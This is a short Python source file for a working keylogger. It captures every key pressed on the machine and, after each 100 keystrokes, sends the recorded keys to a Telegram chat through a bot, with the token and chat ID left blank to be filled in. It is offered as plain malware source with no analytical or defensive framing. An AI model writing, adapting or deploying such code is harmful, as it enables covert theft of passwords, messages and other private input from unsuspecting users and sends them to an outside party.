import keyboard
import telepot

CHAT_ID = ""
TOKEN = ""


class KeylogBot:
    def __init__(self, bot):
        self.bot = bot

    def send_message_string(self, text):
        try:
            if isinstance(text, list):
                text = ",".join(text)
            self.bot.sendMessage(chat_id=CHAT_ID, text=text)
        except Exception as error1:
            self.send_message_string(f"Error sending message: {error1}")


class KeyLog:
    def __init__(self):
        self.pressed_keys = []
        self.total = []

    def logging(self, telegram_bot):
        try:
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key_string = self.convert_event_to_string(event)
                    if key_string:
                        self.pressed_keys.append(key_string)
                    if len(self.pressed_keys) % 100 == 0:
                        break
            self.total.append(self.pressed_keys)
            telegram_bot.send_message_string(self.pressed_keys)
            self.pressed_keys.clear()
        except Exception as error2:
            telegram_bot.send_message_string(f"Error in logging:{error2}")

    @staticmethod
    def convert_event_to_string(event):
        if isinstance(event, keyboard._keyboard_event.KeyboardEvent):
            return event.name if event.event_type == keyboard.KEY_DOWN else ''


def keylogger():
    bot = telepot.Bot(TOKEN)
    record = KeyLog()
    bot = KeylogBot(bot)
    try:
        while True:
            record.logging(bot)
    except KeyboardInterrupt:
        bot.send_message_string(f"Keylogger terminated.")
        print("Exiting...")
        exit()
    except Exception as error0:
        bot.send_message_string(f"Keylogger error: {error0}")
        exit()


if __name__ == "__main__":
    try:
        keylogger()
    except Exception as error:
        print(f"Error: {error}")
        exit(1)
